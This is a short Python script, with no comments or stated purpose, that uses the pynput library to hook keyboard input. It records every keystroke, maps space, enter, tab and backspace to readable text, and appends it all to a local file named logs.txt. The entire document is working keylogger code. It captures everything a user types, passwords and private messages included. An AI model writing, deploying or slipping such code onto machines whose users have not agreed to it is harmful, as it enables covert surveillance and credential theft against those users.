from pynput.keyboard import Listener

key_information = 'logs.txt'

def write_to_file(key):
    log = str(key)
    log = log.replace("'", '')

    if log == 'Key.space':
        log = ' '
    if log == 'Key.enter':
        log = '\n'
    if log == 'Key.tab':
        log = '[tab]'
    if log == 'Key.shift':
        log = ''
    if log == 'Key.backspace':
        log = '[BACKSPACE]'

    with open(key_information, 'a') as f:
        f.write(log)


with Listener(on_press=write_to_file) as listener:
    listener.join()